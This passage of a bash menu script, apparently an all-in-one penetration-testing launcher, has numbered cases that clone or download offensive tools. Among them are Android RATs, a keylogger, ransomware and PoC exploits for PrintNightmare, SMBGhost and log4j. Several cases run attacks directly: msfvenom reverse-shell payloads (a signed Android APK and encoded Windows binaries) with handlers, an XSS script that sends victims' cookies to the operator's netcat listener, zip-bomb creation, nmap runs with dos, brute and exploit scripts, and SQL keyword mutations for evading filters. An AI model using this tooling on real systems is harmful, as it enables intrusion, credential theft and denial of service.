				then
					aws --endpoint-url "$TURL" s3 cp "$RVSH" "s3://""$SDST"
				fi
			fi
		fi
	;;
	"2453")
		echo "Digit the target Url"
		read -p "(example, https://s3.domain.com): " TURL
		if [[ "$TURL" != "" ]];
		then
			echo "Digit a target folder, empty for root folder"
			read -p "(example, adserver): " FLDR
			aws --endpoint-url "$TURL" s3 ls "$FLDR"
		fi
	;;
	"2454")
		echo "Digit the target Url"
		read -p "(example, https://s3.domain.com): " TURL
		if [[ "$TURL" != "" ]];
		then
			aws --endpoint-url "$TURL" dynamodb --table-names
		fi
	;;
	"2455")
		Clona "twitu/byob"
	;;
	"2456")
		Scarica "$ENTSSL""GetRektBoy724/MeterPwrShell/releases/download/v1.5.1/meterpwrshellexec"
	;;
	"2457")
		curl -k -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/install-poetry.py | python -
	;;
	"2458")
		Clona "samyk/glitchsink"
	;;
	"2459")
		Clona "hak5darren/USB-Rubber-Ducky"
	;;
	"2460")
		Clona "ultrasecurity/Storm-Breaker"
	;;
	"2461")
		Clona "stark0de/nginxpwner"
	;;
	"2462")
		Clona "FunnyWolf/pystinger"
	;;
	"2463")
		Clona "d4rckh/vaf"
	;;
	"2464")
		curl -sSf -k https://nim-lang.org/choosenim/init.sh | sh
	;;
	"2465")
		Clona "litneet64/etherblob-explorer"
	;;
	"2466")
		Clona "hemp3l/sucrack"
	;;
	"2467")
		Clona "smaranchand/bucky"
	;;
	"2468")
		Clona "intrudir/403fuzzer"
	;;
	"2469")
		Clona "postrequest/link"
	;;
	"2470")
		Scarica "https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt"
	;;
	"2471")
		Clona "sec-consult/aggrokatz"
	;;
	"2472")
		Clona "EntySec/Shreder"
	;;
	"2473")
		Scarica "$ENTRAW""digininja/RSMangler/master/rsmangler.rb"
	;;
	"2474")
		Clona "bahaabdelwahed/killshot"
	;;
	"2475")
		Clona "yehia-mamdouh/XSSYA-V-2.0"
	;;
	"2476")
		Clona "lightspin-tech/red-shadow"
	;;
	"2477")
		Clona "XMCyber/MacHound"
	;;
	"2478")
		Clona "asaurusrex/Forblaze"
	;;
	"2479")
		Clona "antman1p/GDir-Thief"
	;;
	"2480")
		Clona "WeAreCloudar/s3-account-search"
	;;
	"2481")
		Clona "clario-tech/s3-inspector"
	;;
	"2482")
		Clona "Ullaakut/Gorsair"
	;;
	"2483")
		Clona "AvalZ/WAF-A-MoLE"
	;;
	"2484")
		Clona "gand3lf/heappy"
	;;
	"2485")
		Clona "EntySec/CamRaptor"
	;;
	"2486")
		Clona "AngelSecurityTeam/Cam-Hackers"
	;;
	"2487")
		Clona "acecilia/OpenWRTInvasion"
	;;
	"2488")
		Scarica "$ENTRAW""shadowgatt/CVE-2019-19356/master/CVE-2019-19356_exploit.py"
	;;
	"2489")
		Clona "baktoft/yaps"
	;;
	"2490")
		Clona "k4yt3x/orbitaldump"
	;;
	"2491")
		Clona "edoardottt/cariddi"
	;;
	"2492")
		Clona "liamg/gitjacker"
	;;
	"2493")
		Scarica "https://storage.googleapis.com/google-code-archive-source/v2/code.google.com/pinata-csrf-tool/source-archive.zip" "pinata-csrf-tool.zip"
	;;
	"2494")
		Clona "hashtopolis/server"
	;;
	"2495")
		Clona "cube0x0/CVE-2021-1675"
		Scarica "$ENTRAW""cube0x0/CVE-2021-1675/ee5512a692824b3eb9264ee3600db5721c491509/CVE-2021-1675.py"
	;;
	"2496")
		Clona "mhaskar/DNSStager"
	;;
	"2497")
		Clona "leonv024/RAASNet"
	;;
	"2498")
		Clona "blacklanternsecurity/MANSPIDER"
	;;
	"2499")
		Clona "v-byte-cpu/sx"
	;;
	"2500")
		Clona "jakejarvis/awesome-shodan-queries"
	;;
	"2501")
		Clona "interference-security/zoomeye-data"
	;;
	"2502")
		Clona "ankit0183/Wifi-Hacking"
	;;
	"2503")
		echo "Digit a binary file to analyze"
		read -e -p "(example, ./file.bin): " FLB
		if [[ -f "$FLB" ]];
		then
			echo "Digit a file name to save the report"
			read -e -p "(example, bin.report): " FLRP
			if [[ "$FLRP" != "" ]];
			then
				dbg -ex 'disas main' -ex quit "$FLB" > "$FLRP"
			fi
		fi
	;;
	"2504")
		Clona "tomac/yersinia"
	;;
	"2505")
		Clona "KishanBagaria/padding-oracle-attacker"
	;;
	"2506")
		Clona "Ganapati/RsaCtfTool"
	;;
	"2507")
		Clona "ius/rsatool"
	;;
	"2508")
		Clona "hellman/xortool"
	;;
	"2509")
		Clona "intrd/nozzlr"
	;;
	"2510")
		Clona "hellman/libformatstr"
	;;
	"2511")
		Clona "david942j/one_gadget"
	;;
	"2512")
		Clona "geohot/qira"
	;;
	"2513")
		Clona "JonathanSalwan/ROPgadget"
	;;
	"2514")
		Clona "P1kachu/v0lt"
	;;
	"2515")
		echo "Digit your IP"
		read -p "(example, 192.168.0.1): " MIP
		if [[ "$MIP" != "" ]];
		then
			echo "Digit your PORT"
			read -p "(default, 9001): " -i "9001" MPRT
			if [[ "$MPRT" != "" ]];
			then
				echo "Digit your alias"
				read -p "(example, IDONTKNOW): " ALIAS
				if [[ "$ALIAS" != "" ]];
				then
					msfvenom -p android/meterpreter/reverse_tcp LHOST=$MIP LPORT=$MPRT R > revshell.apk
					keytool -genkey -V -keystore key.keystore -alias $ALIAS -keyalg RSA -keysize 2048 -validity 10000
					jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore revshell.apk $ALIAS
					jarsigner -verify -verbose -certs revshell.apk
					msfconsole -x "use exploit/multi/handler; set LHOST ""$MIP""; set LPORT ""$MPRT""; set PAYLOAD android/meterpreter/reverse_tcp; run"
				fi
			fi
		fi
	;;
	"2516")
		Clona "The404Hacking/AndroRAT"
	;;
	"2517")
		Clona "karma9874/AndroRAT"
	;;
	"2518")
		Clona "AhMyth/AhMyth-Android-RAT"
	;;
	"2519")
		Clona "m301/rdroid"
	;;
	"2520")
		Clona "nyx0/Dendroid"
	;;
	"2521")
		Clona "JohnReagan/i-spy-android"
	;;
	"2522")
		Clona "honglvt/TalentRAT"
	;;
	"2523")
		Scarica "https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/pinata-csrf-tool/Pinata-V0.94.zip"
	;;
	"2524")
		Scarica "$ENTRAW""tokyoneon/CredPhish/master/dns_server.py"
	;;
	"2525")
		Scarica "$ENTRAW""h4wkst3r/InvisibilityCloak/main/InvisibilityCloak.py"
	;;
	"2526")
		Clona "A3h1nt/Grawler"
	;;
	"2527")
		Clona "kleiton0x00/ppmap"
	;;
	"2528")
		Clona "AFLplusplus/AFLplusplus"
	;;
	"2529")
		Clona "Netflix/chaosmonkey"
	;;
	"2530")
		Scarica "$ENTRAW""ButrintKomoni/cve-2020-0796/master/cve-2020-0796-scanner.py"
	;;
	"2531")
		Scarica "$ENTRAW""jiansiting/CVE-2020-0796/master/cve-2020-0796.py"
	;;
	"2532")
		Clona "ZecOps/CVE-2020-0796-RCE-POC"
	;;
	"2533")
		Clona "rscloura/Doldrums"
	;;
	"2534")
		Clona "sc1341/TikTok-OSINT"
	;;
	"2535")
		Clona "WazeHell/LightMe"
	;;
	"2536")
		Scarica "$ENTRAW""dlegs/php-jpeg-injector/master/gd-jpeg.py"
	;;
	"2537")
		Clona "D4Vinci/elpscrk"
	;;
	"2538")
		Clona "nccgroup/Solitude"
	;;
	"2539")
		echo "Digit your IP"
		read -p "(example, 192.168.0.1): " MIP
		if [[ "$MIP" != "" ]];
		then
			echo "Digit your PORT"
			read -p "(default, 9001): " -i "9001" MPRT
			if [[ "$MPRT" =~ ^[0-9]+$ ]];
			then
				select EXT in $(msfvenom -l formats | awk '{print $1}')
				do
					select ENC in $(msfvenom -l encoders | awk '{print $1}')
					do
						echo "Digit how many iterations of encoding"
						read -p "(default, 10): " -i "10" ITE
						if [[ "$ITE" == "" ]];
						then
							ITE="10"
						fi
							msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT -o revshell_32bit.$EXT
							msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
						break
					done
					break
				done
			fi
		fi
	;;
	"2540")
		echo "Digit your IP"
		read -p "(example, 192.168.0.1): " MIP
		if [[ "$MIP" != "" ]];
		then
			echo "Digit your PORT"
			read -p "(default, 9001): " -i "9001" MPRT
			if [[ "$MPRT" =~ ^[0-9]+$ ]];
			then
				select EXT in $(msfvenom -l formats | awk '{print $1}')
				do
					select ENC in $(msfvenom -l encoders | awk '{print $1}')
					do
						echo "Digit how many iterations of encoding"
						read -p "(default, 10): " -i "10" ITE
						if [[ "$ITE" == "" ]];
						then
							ITE="10"
						fi
							msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT -o revshell_64bit.$EXT
							msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
						break
					done
					break
				done
			fi
		fi
	;;
	"2541")
		Clona "avilum/portsscan"
	;;
	"2542")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP address"
			read -p "(example, 10.11.12.13): " TIP
		fi
		whois -h whois.cymru.com "$TIP"
	;;
	"2543")
		echo "Digit your IP"
		read -p "(example, 192.168.1.1): " -i "0.0.0.0" MIP
		if [[ "$MIP" != "" ]];
		then
			MIP="0.0.0.0"
		fi
		echo "Digit your PORT"
		read -p "(default 9001): " -i "9001" MPRT
		if [[ "$MPRT" == "" ]];
		then
			MPRT="9001"
		fi
		echo "Digit Parameters"
		read -p "(example, CMD=\"del /f /s /q C:\\*.*\"): " PARAMS
		if [[ "$PARAMS" == "" ]];
		then
			PARAMS=""
		fi
		echo "Choose a payload"
		select PAY in $(msfvenom -l payloads | awk '{print $1}' | grep "/")
		do
			echo "Choose an architecture"
			select ARC in $(msfvenom -l archs | awk '{print $1}' | grep -v "===" | grep -v "\-\-\-" | grep -v -i "Framework" | grep -v -i "Name")
			do
				echo "Choose an encoder"
				select ENC in $(msfvenom -l encoders | awk '{print $1}' | grep -v "===" | grep -v "\-\-\-" | grep -v -i "Framework" | grep -v -i "Name")
				do
					echo "Digit how many time encode the payload"
					read -p "(default 10): " -i "10" ITE
					if [[ "$ITE" == "" ]];
					then
						ITE="10"
					fi
					echo "Choose a file format"
					select FORM in $(msfvenom -l formats | awk '{print $1}' | grep -v "===" | grep -v "\-\-\-" | grep -v -i "Framework" | grep -v -i "Name")
					do
						echo "Choose an algorithm of cryptography"
						select CRYP in $(msfvenom -l encrypt | awk '{print $1}' | grep -v "===" | grep -v "\-\-\-" | grep -v -i "Framework" | grep -v -i "Name")
						do
							echo "Digit a passphare; if it be empty, it will be created pseudo-randomly"
							read -p "(default is empty): " PSSP
							if [[ "$PSSP" == "" ]];
							then
								PSSP=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 32)
							fi
							MIV=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 16)
							echo "Creating a payload encrypted with ""$PSSP"" passphrase and ""$MIV"" vector"
							echo "msfvenom -p $PAY $PARAMS -a $ARC -e $ENC -i $ITE --encrypt $CRYP --encrypt-key $PSSP --encrypt-iv $MIV -f $FORM LHOST=$MIP LPORT=$MPRT -o payload.$FORM"
							msfvenom -p "$PAY" "$PARAMS" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" --encrypt-iv "$MIV" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
							break
						done
						break
					done
					break
				done
				break
			done
			break
		done
	;;
	"2544")
		Clona "EatonChips/wsh"
	;;
	"2545")
		Clona "DivineSoftware/AutoRoot"
	;;
	"2546")
		Clona "santiko/KnockPy"
	;;
	"2547")
		if [[ -f $(which docker) ]];
		then
			sudo docker image ls
		else
			echo "docker is not installed"
		fi
	;;
	"2548")
		if [[ -f $(which docker) ]];
		then
			select DIM in $(sudo docker image ls | awk '{print $1}')
			do
				echo "Digit a command"
			 	read -p "(example, /bin/bash): " CMD
				if [[ "$CMD" != "" ]];
				then
					docker run -it "$DIM" "$CMD"
				fi
				break
			done
		else
			echo "docker is not installed"
		fi
	;;
	"2549")
		if [[ -f $(which docker) ]];
		then
			docker ps
		else
			echo "docker is not installed"
		fi
	;;
	"2550")
		Clona "s1l3nt78/sifter"
	;;
	"2551")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "ORCA666/EarlyBird"
		fi
	;;
	"2552")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script vuln -p "$TPRT" "$TIP"
	;;
	"2553")
		Clona "mrlew1s/BrokenSMTP"
	;;
	"2554")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "dmaasland/proxyshell-poc"
		fi
	;;
	"2555")
		Clona "junegunn/fzf"
	;;
	"2556")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit target IP"
			read -p "(example 192.168.168.2): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORT"
			read -p "(example 135): " TPRT
		fi
		if [[ "$TUSRN" == "" ]];
		then
			echo "Digit target username"
			read -p "(example john): " TUSRN
		fi
		if [[ "$TPSSW" == "" ]];
		then
			echo "Digit target password"
			read -p "(example john): " TPSSW
		fi
		if [[ "$TDOM" == "" ]];
		then
			echo "Digit target pc-domain"
			read -p "(example WORKGROUP): " TDOM
		fi
		echo "Digit target command line"
		read -p "(example nc -lvnp 80): " CMD
		if [[ "$CMD" != "" ]];
		then
			rpcclient --user $TDOM\$TUSRN%$TPSSW -c "$CMD" -p "$TPRT" "$TIP"
		fi
	;;
	"2557")
		echo "Digit target IP"
		read -p "(example 192.168.168.2): " TIP
	;;
	"2558")
		echo "Digit target PORT"
		read -p "(example 135): " TPRT
	;;
	"2559")
		echo "Digit target username"
		read -p "(example john): " TUSRN
	;;
	"2560")
		echo "Digit target password"
		read -p "(example john): " TPSSW
	;;
	"2561")
		echo "Digit target pc-domain"
		read -p "(example WORKGROUP): " TDOM
	;;
	"2562")
		echo "Digit a wordlist"
		read -e -p "(example /usr/share/wordlists/rockyou.txt): " WORDLIST
	;;
	"2563")
		echo "Digit a binary to disassemle"
		read -e -p "(exmple, /home/kali/file.bin): " FBIN
		if [[ -f "$FBIN" ]];
		then
			objdump -d "$FBIN" > "$FBIN"".disasm"
		fi
	;;
	"2564")
		echo "Digit a binary to dispaly all headers"
		read -e -p "(exmple, /home/kali/file.bin): " FBIN
		if [[ -f "$FBIN" ]];
		then
			objdump -x "$FBIN" > "$FBIN"".heads"
		fi
	;;
	"2565")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "C0MPL3XDEV/E4GL30S1NT"
		fi
	;;
	"2566")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "0x1CA3/AdbNet"
		fi
	;;
	"2567")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "0xFreddox/KeyLogger-WebService"
		fi
	;;
	"2568")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "Abhay2342/Network-Scanner"
		fi
	;;
	"2569")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "xadhrit/d9scan"
		fi
	;;
	"2570")
		if [[ "$ANON" == "Disabled" ]];
		then
			echo "Enabling Anonymization"
			ANON="Enabled"
			if [[ -f $(which systemctl) ]];
			then
				sudo systemctl start tor
			elif [[ -f $(which sv) ]];
			then
				sv start tor
			fi
			CURLANON="--socks5 127.0.0.1:9050"
			DEFANON="127.0.0.1:9050"
		else
			echo "Disabling Anonymization"
			ANON="Disabled"
			if [[ -f $(which systemctl) ]];
			then
				sudo systemctl stop tor
			elif [[ -f $(which sv) ]];
			then
				sv stop tor
			fi
			CURLANON=""
			DEFANON=""
		fi
	;;
	"2571")
		Clona "knightm4re/tomcter"
	;;
	"2572")
		if [[ "$MIP" == "" || "$MIP" != "http"* ]];
		then
			echo "Digit YOUR IP address with HTTP protocol, choosing between http:// and https://"
			read -p "(example, http://10.11.12.13): " MIP
		fi
		echo "Digit the Target IP address with HTTP protocol, choosing between http:// and https://"
		read -p "(example, http://10.11.12.14): " TIP
		if [[ "$TIP" != "" ]];
		then
			echo "document.write('document.cookie');"
			echo "document.write('<img src=\"""$MIP""/?'+document.cookie+'\">');" > ./img.js
			echo "COPY and PASTE this javascript code to receive via netcat the cookie in HTTP GET response"
			echo "<script src=\"""$TIP""/img.js\"></script>"
			if [[ "$MIP" == "https://"* ]];
			then
				sudo nc -lvnp 443
			elif [[ "$MIP" == "http://"* ]];
			then
				sudo nc -lvnp 80
			fi
		fi
	;;
	"2573")
		echo "Digit Your IP with or without PROTOCOL"
		read -p "(example 192.168.168.2 or http://192.168.168.2): " MIP
	;;
	"2574")
		echo "Digit Your Port"
		read -p "(example 80): " MPRT
	;;
	"2575")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script auth -p "$TPRT" "$TIP"
	;;
	"2576")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script broadcast -p "$TPRT" "$TIP"
	;;
	"2577")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script brute -p "$TPRT" "$TIP"
	;;
	"2578")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script default -p "$TPRT" "$TIP"
	;;
	"2579")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script discovery -p "$TPRT" "$TIP"
	;;
	"2580")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script dos -p "$TPRT" "$TIP"
	;;
	"2581")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script exploit -p "$TPRT" "$TIP"
	;;
	"2582")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script external -p "$TPRT" "$TIP"
	;;
	"2583")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script fuzzer -p "$TPRT" "$TIP"
	;;
	"2584")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script intrusive -p "$TPRT" "$TIP"
	;;
	"2585")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script malware -p "$TPRT" "$TIP"
	;;
	"2586")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script safe -p "$TPRT" "$TIP"
	;;
	"2587")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit a target IP"
			read -p "(example, 192.168.168.3): " TIP
		fi
		if [[ "$TPRT" == "" ]];
		then
			echo "Digit target PORTs"
			read -p "(example, 445 or 135-139 or 21,22): " TPRT
		fi
		sudo nmap -sS -Pn -v -n -ff --mtu 8 -T2 -g 80 --script version -p "$TPRT" "$TIP"
	;;
	"2588")
		Clona "aufzayed/HydraRecon"
	;;
	"2589")
		Clona "xchopath/pathprober"
	;;
	"2590")
		Clona "sensepost/assless-chaps"
	;;
	"2591")
		echo "Digit a binary file"
		read -e -p "(example, ./pwnme): " FBIN
		if [[ -f "$FBIN" ]];
		then
			python -c "from pwn import *;from pprint import pprint;elf = ELF('""$FBIN""');print(elf);pprint(elf.symbols)"
		fi
	;;
	"2592")
		Clona "Malam-X/DragonMS"
	;;
	"2593")
		Clona "tegal1337/CiLocks"
	;;
	"2594")
		Clona "WangYihang/SourceLeakHacker"
	;;
	"2595")
		Scarica "$ENTRAW""navin-maverick/BruteBot/master/BruteBot.py"
	;;
	"2596")
		Clona "Revise7/ViperVenom"
	;;
	"2597")
		Clona "DrPython3/MailRipV2"
	;;
	"2598")
		Clona "DedSecInside/gotor"
	;;
	"2599")
		Clona "oldkingcone/slopShell"
	;;
	"2600")
		Clona "s41r4j/phomber"
	;;
	"2601")
		Clona "souravbaghz/CarPunk"
	;;
	"2602")
		Clona "nccgroup/Sniffle"
	;;
	"2603")
		Clona "BeetleChunks/SpoolSploit"
	;;
	"2604")
		Scarica "$ENTRAW""d4t4s3c/Shelly/main/shelly.sh"
	;;
	"2605")
		Clona "FunnyWolf/Viper"
	;;
	"2606")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "sumo2001/Trishul"
		fi
	;;
	"2607")
		Clona "idealeer/xmap"
	;;
	"2608")
		CLona "lawndoc/mediator"
	;;
	"2609")
		Clona "V1n1v131r4/webdiscover"
	;;
	"2610")
		Clona "xadhrit/terra"
	;;
	"2611")
		Clona "ochronasec/ochrona-cli"
	;;
	"2612")
		Clona "Tylous/ZipExec"
	;;
	"2613")
		Clona "RedSection/jspanda"
	;;
	"2614")
		Clona "kostas-pa/LFITester"
	;;
	"2615")
		Clona "rivalsec/pathbuster"
	;;
	"2616")
		Clona "emrekybs/Expulso"
	;;
	"2617")
		Clona "hpthreatresearch/subcrawl"
	;;
	"2618")
		Clona "Deadpool2000/Paybag"
	;;
	"2619")
		Clona "Q0120S/NoobWebHunter"
	;;
	"2620")
		Clona "AsjadOooO/Zero-attacker"
	;;
	"2621")
		Clona "sky9262/phishEye"
	;;
	"2622")
		Clona "phath0m/JadedWraith"
	;;
	"2623")
		Clona "michelin/ChopChop"
	;;
	"2624")
		Scarica "http://www.unforgettable.dk/42.zip"
	;;
	"2625")
		echo "Digit a KByte value"
		read -p "(example, 10000): " KB
		if [[ "$KB" != "" ]];
		then
			dd if=/dev/zero bs=1024 count=$KB | zip zipbomb.zip -
		fi
	;;
	"2626")
		echo "Select an exploit"
		select UNO in $(msfconsole -q -x "show exploits; exit" | awk '{print $2}' | grep "$exploit/")
		do
		echo "Select a payload"
			select DUE in $(msfconsole -q -x "show payloads; exit" | awk '{print $2}' | grep "$payload/")
			do
				echo "Digit parameters, divided with semicolon and space"
				read -p "(example, set RHOSTS 10.11.12.13; set RPORT 9001): " PRMT
				if [[ "$PRMT" != "" ]];
				then
					echo "msfconsole -q -x \"use $UNO; set PAYLOAD $DUE; $PRMT; run\""
					msfconsole -q -x "use $UNO; set PAYLOAD $DUE; $PRMT; run"
				fi
			break
			done
		break
		done
	;;
	"2627")
		Clona "fullhunt/log4j-scan"
	;;
	"2628")
		Clona "kozmer/log4j-shell-poc"
	;;
	"2629")
		Clona "SecuProject/ADenum"
	;;
	"2630")
		Clona "9emin1/charlotte"
	;;
	"2631")
		Clona "omer-dogan/kali-whoami"
	;;
	"2632")
		Clona "PalindromeLabs/STEWS"
	;;
	"2633")
		if [[ "$TURL" == "http://0.0.0.0" ]];
		then
			echo "Digit the Target url"
			read -p "(example, http://www.terget.com): " TURL
		fi
		echo "Digit the POST parameters with the special char (please, single quote has got to have backslash to escape in input)"
		read -p "(example with a single quote, email=hello@gmail.com\'): " PAR
		if [[ "$PAR" != "" ]];
		then
			MSEL=("SELECT" "SELECt" "SELEcT" "SELEct" "SELeCT" "SELeCt" "SELecT" "SELect" "SElECT" "SElECt" "SElEcT" "SElEct" "SEleCT" "SEleCt" "SElecT" "SElect" "SeLECT" "SeLECt" "SeLEcT" "SeLEct" "SeLeCT" "SeLeCt" "SeLecT" "SeLect" "SelECT" "SelECt" "SelEcT" "SelEct" "SeleCT" "SeleCt" "SelecT" "Select" "sELECT" "sELECt" "sELEcT" "sELEct" "sELeCT" "sELeCt" "sELecT" "sELect" "sElECT" "sElECt" "sElEcT" "sElEct" "sEleCT" "sEleCt" "sElecT" "sElect" "seLECT" "seLECt" "seLEcT" "seLEct" "seLeCT" "seLeCt" "seLecT" "seLect" "selECT" "selECt" "selEcT" "selEct" "seleCT" "seleCt" "selecT" "select" "SELSELECTECT" "selselectect")
			MUNI=("UNION" "UNIOn" "UNIoN" "UNIon" "UNiON" "UNiOn" "UNioN" "UNion" "UnION" "UnIOn" "UnIoN" "UnIon" "UniON" "UniOn" "UnioN" "Union" "uNION" "uNIOn" "uNIoN" "uNIon" "uNiON" "uNiOn" "uNioN" "uNion" "unION" "unIOn" "unIoN" "unIon" "uniON" "uniOn" "unioN" "union" "UNIUNIONON" "uniunionon")
			MCON=("CONCAT" "CONCAt" "CONCaT" "CONCat" "CONcAT" "CONcAt" "CONcaT" "CONcat" "COnCAT" "COnCAt" "COnCaT" "COnCat" "COncAT" "COncAt" "COncaT" "COncat" "CoNCAT" "CoNCAt" "CoNCaT" "CoNCat" "CoNcAT" "CoNcAt" "CoNcaT" "CoNcat" "ConCAT" "ConCAt" "ConCaT" "ConCat" "ConcAT" "ConcAt" "ConcaT" "Concat" "cONCAT" "cONCAt" "cONCaT" "cONCat" "cONcAT" "cONcAt" "cONcaT" "cONcat" "cOnCAT" "cOnCAt" "cOnCaT" "cOnCat" "cOncAT" "cOncAt" "cOncaT" "cOncat" "coNCAT" "coNCAt" "coNCaT" "coNCat" "coNcAT" "coNcAt" "coNcaT" "coNcat" "conCAT" "conCAt" "conCaT" "conCat" "concAT" "concAt" "concaT" "concat" "CONCONCATCAT" "conconcatcat")
			MLIM=("LIMIT" "LIMIt" "LIMiT" "LIMit" "LImIT" "LImIt" "LImiT" "LImit" "LiMIT" "LiMIt" "LiMiT" "LiMit" "LimIT" "LimIt" "LimiT" "Limit" "lIMIT" "lIMIt" "lIMiT" "lIMit" "lImIT" "lImIt" "lImiT" "lImit" "liMIT" "liMIt" "liMiT" "liMit" "limIT" "limIt" "limiT" "limit" "LIMLIMITIT" "limlimitit")
